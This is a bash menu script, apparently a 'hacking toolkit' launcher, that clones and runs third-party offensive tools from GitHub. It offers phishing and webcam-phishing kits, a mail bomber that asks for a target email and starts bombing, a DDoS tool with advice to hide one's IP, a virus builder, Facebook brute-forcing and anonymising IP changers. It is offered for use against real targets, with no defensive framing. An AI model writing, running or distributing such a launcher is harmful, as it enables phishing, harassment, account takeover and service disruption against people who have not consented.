clear
mkdir Tools
clear 
echo -e '\n
\033[33;4mVersion:\033[0m 5              \033[33;4mCTRL+C:\033[0m exit           \033[33;4mAuthor:\033[0m Armin11

\033[37m[ 1]\033[36m Requests & Update            \033[37m[ 2]\033[36m Phishing Tool\033[0m
\033[37m[ 3]\033[36m WebCam Hack                  \033[37m[ 4]\033[36m Subscan\033[0m
\033[37m[ 5]\033[36m Gmail Bomber                 \033[37m[ 6]\033[36m DDOS Attack\033[0m
\033[37m[ 7]\033[36m How to use?                  \033[37m[ 8]\033[36m Install downloaded programs\033[0m
\033[37m[ 9]\033[36m IP Info                      \033[37m[10]\033[36m dorks-eye\033[0m
\033[37m[11]\033[36m HackerPro                    \033[37m[12]\033[36m RED_HAWK\033[0m
\033[37m[13]\033[36m VirusCrafter                 \033[37m[14]\033[36m Info-Site\033[0m
\033[37m[15]\033[36m BadMod                       \033[37m[16]\033[36m Facebash\033[0m
\033[37m[17]\033[36m DARKARMY                     \033[37m[18]\033[36m AUTO-IP-CHANGER\033[0m
'
read -p "Enter option number: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear

echo -e "\033[47;31;5m Installing updates and dependencies...\033[0m"
sleep 5
apt install git -y
apt install python python3 -y
apt install pip pip3 -y
apt install curl -y
apt update
apt upgrade -y
clear
echo -e "\033[47;3;35m Update complete...\033[0m"
sleep 3
bash best.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh

elif [[ $islem == 3 || $islem == 03 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
git clone https://github.com/zidansec/subscan
cd subscan
read -p "Enter a domain (e.g. example.com): " sc
./subscan $sc
       
elif [[ $islem == 5 || $islem == 05 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/juzeon/fast-mail-bomber.git
cd fast-mail-bomber/
mv config.example.php config.php
php index.php update-providers
rm -rf data/nodes.json data/dead_providers.json
echo -e "\033[47;3;35m This installation will take a long time\033[0m"
echo -e "\033[47;3;35m To stop, press Ctrl+C\033[0m"
sleep 4
php index.php update-nodes
php index.php refine-nodes
echo "-------------------------"
read -p "Enter an email address to target: " mail
echo "-------------------------"
php index.php start-bombing $mail

elif [[ $islem == 6 || $islem == 06 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py
echo ""
echo -e "\033[47;3;35m Before using it, hide your IP\033[0m"

elif [[ $islem == 7 || $islem == 07 ]]; then
clear
echo "YouTube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
sleep 10
echo "Waiting 10 seconds"
bash best.sh
 
elif [[ $islem == 8 || $islem == 08 ]]; then
clear
echo -e "\033[47;3;35m REMOVING downloaded programs...\033[0m"
sleep 3 
rm -rf Tools
bash best.sh

elif [[ $islem == 9 || $islem == 09 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt update
apt install git curl
git clone https://github.com/htr-tech/track-ip.git
cd track-ip
bash trackip

elif [[ $islem == 10 || $islem == 010 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py

elif [[ $islem == 11 || $islem == 011 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt update && apt upgrade && apt install git && apt install python2
git clone https://github.com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py

elif [[ $islem == 12 || $islem == 012 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $islem == 13 || $islem == 013 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
apt install git -y
cd TigerVirus
bash app.sh

elif [[ $islem == 14 || $islem == 014 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt install curl -y
upgrade -y
apt install git -y
git clone https://github.com/king-hacking/info-site.git
cd info-site
bash info.sh

elif [[ $islem == 15 || $islem == 015 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
sudo apt-get update
sudo apt-get install php
sudo apt-get install php-curl
git clone https://github.com/MrSqar-Ye/BadMod.git
cd BadMod
chmod u+x INSTALL
chmod u+x BadMod.php
sudo php BadMod.php

elif [[ $islem == 16 || $islem == 016 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/fu8uk1/facebash
cd facebash
bash install.sh
chmod +x facebash.sh
tor
sudo ./facebash.sh

elif [[ $islem == 17 || $islem == 017 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt install git
apt install python2
apt install git
apt install python2
git clone https://github.com/D4RK-4RMY/DARKARMY
cd DARKARMY
chmod +x darkarmy.py
python2 darkarmy.py

elif [[ $islem == 18 || $islem == 018 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
echo -e "\033[47;3;35m This tool will require you to be (ROOT)\033[0m"
sleep 3
cd Tools
sudo apt-get install tor
pip3 install requests
git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
cd Auto_Tor_IP_changer
echo -e "\033[47;3;35m Go to your browser / change proxy (SOCKS proxy) to 127.0.0.1:9050\033[0m"
sleep 8
python3 install.py
aut

else   
	clear
        echo -e '\033[36;40;1m You entered an invalid code'	
	sleep 1
	clear 
	bash best.sh
fi